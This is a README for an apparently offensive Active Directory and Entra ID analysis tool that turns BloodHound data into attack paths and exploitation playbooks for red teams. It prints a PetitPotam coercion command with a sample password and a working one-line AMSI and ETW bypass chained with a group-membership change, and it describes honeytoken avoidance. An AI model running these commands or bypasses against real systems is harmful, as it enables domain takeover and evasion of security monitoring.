# ☥ Pharaohound ☥

**Pharaohound** (v1.0.0) is a streaming, concurrent, and highly modular Active Directory (AD) & Hybrid Azure (Entra ID) BloodHound JSON analysis engine. Inspired by the diagnostic wisdom of the ancient gods, it maps complex attack paths, conducts risk assessments, prioritizes paths based on OpSec detection footprints, and automatically generates copy-paste-ready exploitation/remediation playbooks for penetration testers and red team operators.

---

## ⚱ Key Features

*   **⚡ High-Performance Streaming Parser**: Uses `ijson` to parse multi-gigabyte BloodHound JSON files iteratively with flat memory usage. Safely falls back to a custom character-by-character chunked reader to keep memory usage completely flat if dependencies are missing.
*   **🧵 Concurrency**: Parses multiple JSON category files (users, computers, groups, GPOs, OUs, containers, AD CS certificates/CAs, and Azure entities) in parallel.
*   **🛡 Modular Analyzers**: Discover and execute modular plugins dynamically. Adding new checks is as simple as dropping a subclass of `BaseAnalyzer` into the `pharaohound/analyzers/` directory.
*   **🎨 Premium Visuals**: Beautiful gold-and-turquoise terminal styling utilizing the `rich` library, with a fallback to lightweight plain-text tables for minimal shell environments.
*   **📝 Multi-Format Reporting**: Generates clean console reports, interactive HTML graph visualizations (using Vis.js), and detailed text summaries.
*   **🐚 Navigable Command Shell (`--shell`)**: Drops operators into an interactive command prompt post-analysis to query nodes, explore attack paths, retrieve recommendations, and generate tailored playbooks.
*   **🐣 "Pentest Noob" Mode (`--noob`)**: Provides a simplified, high-signal output filtering intermediate hops, translating jargon into step-by-step plain English, and generating focused graphs.
*   **⚙ Variable Interpolation (`--vars`)**: Substitutes command placeholders (like `<DC_IP>`, `<PASSWORD>`, `<TARGET_USER>`) dynamically using a custom environment JSON file.
*   **📢 GitHub Update Notifier**: Automatically and non-blockingly checks for the latest releases on GitHub using a strict connection timeout, notifying the operator if a newer version is available.

---

## 📁 Repository Structure

```text
FullProject/
├── pharaohound/                     # Main Python package
│   ├── __init__.py                  # Version and package info
│   ├── __main__.py                  # Entry point for 'python -m pharaohound'
│   ├── cli.py                       # CLI parsing and engine coordinator
│   ├── attack_paths.py              # Attack path building logic and OpSec scoring
│   ├── graph.py                     # Graph traversal helper utilities
│   ├── intelligence.py              # Remediation and playbooks database
│   ├── models.py                    # BloodHound AD/Azure entity models
│   ├── noob.py                      # "Pentest Noob" mode translator
│   ├── parsers.py                   # Parallel ijson/chunked loader
│   ├── reachability.py              # Compromised user reachability analysis and filtering
│   ├── recommendations.py           # OpSec-Aware prioritizing and recommendations
│   ├── shell.py                     # Interactive CLI post-analysis navigation shell
│   ├── tactical.py                  # Playbook variable interpolation engine
│   ├── theme.py                     # Color themes and glyphs
│   ├── update.py                    # Non-blocking GitHub update notifier client
│   │
│   ├── analyzers/                   # Modular finding analyzers
│   │   ├── __init__.py              # Dynamic analyzer imports list
│   │   ├── base.py                  # BaseAnalyzer and Finding structures
│   │   ├── registry.py              # Self-registering analyzer loader
│   │   ├── kerberoast.py            # Kerberoasting analyzer
│   │   ├── asrep.py                 # ASREP-roasting analyzer
│   │   ├── adcs.py                  # AD CS ESC1-ESC13 analyzer
│   │   ├── azure.py                 # Azure/Hybrid AD paths analyzer
│   │   └── ...                      # 16+ other vulnerability analyzers
│   │
│   └── reporters/                   # Output formatters
│       ├── __init__.py              # Reporters init
│       ├── console.py               # Rich/ASCII console outputs
│       ├── text.py                  # Text file reporter
│       └── html.py                  # Interactive HTML graph reporter
│
├── pharaohound.py                   # Root script launcher wrapper
├── pyproject.toml                   # Modern PEP 517 installation/build file
└── requirements.txt                 # Optional high-performance dependencies
```

---

## 🚀 Installation & Setup

### Install via pipx (Recommended)
The recommended way to install `pharaohound` as a standalone CLI tool is using `pipx`, which automatically sets up a virtual environment and adds the tool to your system PATH:

**From a local folder:**
```bash
pipx install .
```

### Local Script Execution
You can run the script directly from the downloaded repository folder without installing it:
```bash
python pharaohound.py <directory_with_bloodhound_jsons>
```

### Standard pip Installation
Alternatively, install the package using standard pip:
```bash
pip install .
```

Once installed via pip or pipx, execute the tool from anywhere via:
```bash
pharaohound <directory_with_bloodhound_jsons>
# OR
python -m pharaohound <directory_with_bloodhound_jsons>
```

---

## 🛠 Usage & Command Line Options

```bash
pharaohound --help
```

### Command Line Flags:
*   `directory`: The folder containing your SharpHound or BloodHound `.json` collections.
*   `-o`, `--output`: Target directory for generating file reports (defaults to `.`).
*   `--format`: Report output format (options: `text`, `html`, `both`, `console-only`; defaults to `both`).
*   `--user`: Compromised user account (`USER@DOMAIN`). Can be specified multiple times to run targeting specific compromised entrypoints.
*   `--all`: Run a full unfiltered scan (skip interactive user selection).
*   `--no-color`: Disable ANSI colored terminal outputs.
*   `--no-rich`: Disable Rich tables (uses fallback ASCII-text tables).
*   `--workers`: Customize parallel worker count for ingestion.
*   `--list-analyzers`: Displays all registered analyzers and exits.
*   `--noob`: Enable "Pentest Noob" mode for simplified jargon-free steps and high-signal focus.
*   `--evasion`: Enable the Tactical Evasion Engine to automatically prepend AMSI and ETW bypass payloads to PowerShell playbooks.
*   `--vars`, `--variables`: JSON configuration file containing environment variables (e.g., target DC IP) to dynamically interpolate playbook placeholders.
*   `--shell`: Drop into the interactive shell after analysis.

---

## 🐚 Interactive Command Shell (`--shell`)

After the initial parsing and analysis is complete, dropping into the interactive shell allows red teams to query results dynamically without re-running scans.

### Available Shell Commands:
*   `help`: Show the shell command helper menu.
*   `stats`: View domain-wide statistics (object count per type, findings, attack paths, recommendations).
*   `nodes [type]`: List loaded AD objects. Optionally filter by type: `user`, `group`, `computer`, `gpo`, `ou`, `domain`, `ca`, `certtemplate`, `azure`.
*   `find <name>`: Search for a node by partial name match.
*   `info <name>`: Show detailed information about a node (including SID, domain, enabled status, admincount status, specific properties like SPNs or delegation settings, and incoming/outgoing ACEs).
*   `paths`: List all discovered attack paths with their corresponding OpSec rating and severity.
*   `path <index>`: Show detailed step-by-step description and exploitation commands for a specific attack path (1-indexed).
*   `recs`: Show prioritized recommendations list with action descriptions, commands, and alt commands.
*   `commands <right>`: Show exploitation playbooks, remediation, and ELI5 descriptions for a specific BloodHound edge/right (e.g. `GenericAll`, `WriteDacl`, `ReadLAPSPassword`).
*   `edges`: List all known edge types with intelligence summaries and threat level.
*   `exit` / `quit`: Exit the interactive shell.

**Example Shell Session:**
```text
  ☥ pharaohound> nodes ca
  Objects (1):
      1. [ca] NANOCA

  ☥ pharaohound> info NANOCA
  Node: NANOCA
  Type: ca
  SID:  ca-guid
  Enabled: True
  Properties:
    web_enrollment: True
    has_editf_flag: True

  ☥ pharaohound> paths
  Attack Paths (13):
      1. [CRITICAL] Administrator Session Hijack via LSASS mini-dump  🟢 SILENT
      2. [HIGH] Domain Takeover via AD CS ESC1 Misconfiguration  🟡 LOW

  ☥ pharaohound> path 2
  Path 2: Domain Takeover via AD CS ESC1 Misconfiguration
  Severity: HIGH  🟡 LOW
  Summary: Request a certificate for Domain Admin via ESC1 Template
  Steps:
    1. You control a low-priv user.
    2. Query vulnerable templates.
    3. Run Certipy to request the certificate specifying UPN.
```

---

## ⚙ Playbook Variable Interpolation (`--vars`)

Pharaohound allows operators to supply a variables file to replace default command placeholders (like `<DC_IP>`, `<PASSWORD>`, `<TARGET_USER>`) dynamically.

**Example `variables.json`:**
```json
{
  "domain_controller": "10.10.10.10",
  "dc_hostname": "DC01.CORP.LOCAL",
  "attacker_host": "10.10.14.5",
  "compromised_password": "Password123!",
  "target_user": "Administrator",
  "controlled_computer": "EVIL-WORKSTATION$"
}
```

**Running with Variables:**
```bash
python pharaohound.py testCase --all --vars variables.json
```

Output commands will automatically render with the custom variables populated, making them 100% copy-paste-ready for your terminal.

### Example: Before and After Interpolation

**1. Standard Output (Without `--vars`)**
When running without variables, Pharaohound provides the exact syntax but leaves placeholders for you to fill in:
```bash
python pharaohound.py testCase --all
```
*Generated Command:*
```bash
python3 PetitPotam.py -u '<DOMAIN_USER>' -p '<PASSWORD>' <UD_HOST> <DC_IP>
```

**2. Interpolated Output (With `--vars`)**
When you provide the `vars.json` file, the engine automatically replaces the placeholders with your live engagement data:
```bash
python pharaohound.py testCase --all --vars vars.json
```
*Generated Command (Copy-Paste Ready):*
```bash
python3 PetitPotam.py -u 'Administrator' -p 'Password123!' <UD_HOST> 10.10.10.10
```
*(Notice how `<DOMAIN_USER>`, `<PASSWORD>`, and `<DC_IP>` were automatically mapped from the JSON file!)*

### Example: Combining Variables with Evasion (`--evasion`)
For maximum operational efficiency, combine variable interpolation with the evasion engine. Pharaohound will fill in your passwords/IPs *and* inject AMSI/ETW bypasses into PowerShell playbooks:

```bash
python pharaohound.py testCase --all --vars vars.json --evasion
```
*Generated Command (Copy-Paste Ready & Evasive):*
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); [Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([System.Diagnostics.Eventing.EventProvider],0); Add-DomainGroupMember -Identity '<TARGET_GROUP>' -Members 'Administrator'
```

---

## ☥ List of Built-In Analyzers

Pharaohound executes a comprehensive suite of automated diagnostic analyzers:
*   **Kerberoastable Users**: Identifies SPN-enabled accounts, prioritizing those in high-value groups.
*   **ASREP-Roasting**: Finds accounts with pre-authentication disabled.
*   **Dangerous ACLs**: Identifies dangerous object control permissions (GenericAll, WriteDacl, etc.).
*   **Unconstrained Delegation**: Finds computers where Kerberos ticket harvesting is possible.
*   **Constrained Delegation**: Identifies delegation paths to domain computers.
*   **LAPS Configuration**: Checks for LAPS password reading permissions.
*   **DCSync Capabilities**: Detects delegation of replication sync rights (GetChanges/GetChangesAll).
*   **Active Sessions**: Cross-references user sessions with high-risk target devices.
*   **Group Policy (GPO) Abuse**: Analyzes paths to exploit misconfigured GPOs linked to sensitive OUs.
*   **Self-Add to Group**: Finds accounts with permissions (AddMember/GenericAll/etc.) to add themselves to groups they are not currently in.
*   **AD Trust Integrity**: Detects external/foreign trusts vulnerability paths.
*   **Machine Account Quota (MAQ)**: Analyzes ms-DS-MachineAccountQuota domain setting to detect RBCD viability.
*   **gMSA Password Readers**: Detects accounts authorized to read managed passwords of Group Managed Service Accounts (gMSAs).
*   **AD CS Misconfigurations**: Detects **ESC1 through ESC13** certificate-based privilege escalation vectors in Active Directory Certificate Services (including template misconfigurations, weak CA security descriptors, weak binding enforcement, custom Policy OIDs, **ESC11** RPC encryption status, and **ESC12** YubiHSM key storage registry credential risk).
*   **Azure Hybrid Paths**: Analyzes Azure AD Connect Sync Server Takeover paths, AppRole/Owner privilege abuse, and Azure VM Contributor Pivots.
*   **Advanced Azure & Entra ID Abuse**: Identifies Seamless SSO (AZUREADSSOACC) abuse, Primary Refresh Token (PRT) extraction paths, and Intune MDM pushes.
*   **Ticket Forging & Constrained Delegation**: Detects Golden/Silver ticket forging capabilities via compromised `krbtgt` or service accounts.
*   **Advanced Kerberos Evasion**: Detects AS-REP Roasting downgrades, Pass-the-Certificate (PTC), and provides FAST bypass notes.
*   **Infrastructure Abuse**: Maps pathways to take over SCCM, WSUS, and Exchange Trusted Subsystem.
*   **GPP & LAPS Decryption**: Identifies legacy GPP cpasswords and integrates Windows LAPS v2 decryption paths.
*   **AD Architecture & Stealth**: Maps Cross-Forest SID History hopping, Bastion Forest PAM Trusts, WebClient Coercion, and DCSync stealth targets.
*   **Advanced Persistence**: Detects vectors for installing Skeleton Key or Malicious SSPs on Domain Controllers.
*   **Honeytoken Filtering**: Detects and highlights decoy accounts (e.g., 'admin' with zero logons) to prevent triggering high-fidelity alerts.
*   **OS Vulnerabilities**: Identifies outdated or vulnerable Windows OS versions.
*   **Password Policy**: Checks password policies, expiry flags, and maximum password age settings.
